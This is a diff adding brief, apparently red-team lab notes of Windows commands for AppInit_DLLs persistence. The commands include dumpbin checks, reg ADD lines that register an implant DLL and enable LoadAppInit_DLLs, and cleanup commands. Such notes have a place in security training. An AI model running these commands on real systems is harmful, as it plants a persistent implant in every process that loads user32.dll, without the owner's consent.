@@ -1,0 +1,16 @@
+
+-----CHEK
+dumpbin /import c:\Windows\system32\user32.dll | findstr /i appinit
+dumpbin /import c:\Windows\system32\kernel32.dll | findstr /i appinit
+
+
+reg ADD "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v "AppInit_DLLs" /T REG_SZ /D "c:\rto\pers\implant\implant.dll" /F
+
+
+reg ADD "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows" /V "LoadAppInit_DLLs" /T REG_DWORD /D "0x1" /F
+
+
+reg DELETE "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v "AppInit_DLLs" /f
+
+reg ADD "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows" /V "LoadAppInit_DLLs" /T REG_DWORD /D "0x0" /F
+
